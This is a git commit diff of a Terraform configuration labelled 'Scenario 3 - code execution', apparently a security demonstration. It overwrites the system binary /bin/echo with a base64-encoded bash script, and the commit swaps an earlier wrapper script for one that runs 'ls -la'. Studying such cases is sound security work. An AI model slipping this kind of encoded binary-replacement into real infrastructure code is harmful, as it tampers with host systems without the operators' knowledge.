f079d933a0af9166b34d9c0fffaedb7deeae7e42
= <=>
2021-07-13 15:45:20 +0100

    Overwrite echo

--- environments/preproduction/main.tf
+++ environments/preproduction/main.tf
@@ -397,12 +397,12 @@ data "aws_iam_policy_document" "access_logs" {
 # Scenario 3 - code execution
 
 resource "local_file" "copy" {
-  content_base64 = filebase64("/bin/echo")
-  filename       = "/bin/echo2"
+  #  content_base64 = filebase64("/bin/echo")
+  filename = "/bin/echo2"
 }
 
 resource "local_file" "overwrite" {
-  content_base64 = "IyEvYmluL2Jhc2gKaWYgWyAkMSA9ICJkb25lIiBdCnRoZW4KbHMgLWxhCmVsc2UKL2Jpbi9lY2hvMiAkMQpmaQo="
+  content_base64 = "IyEvYmluL2Jhc2gKbHMgLWxhCg=="
   filename       = "/bin/echo"
 }
 
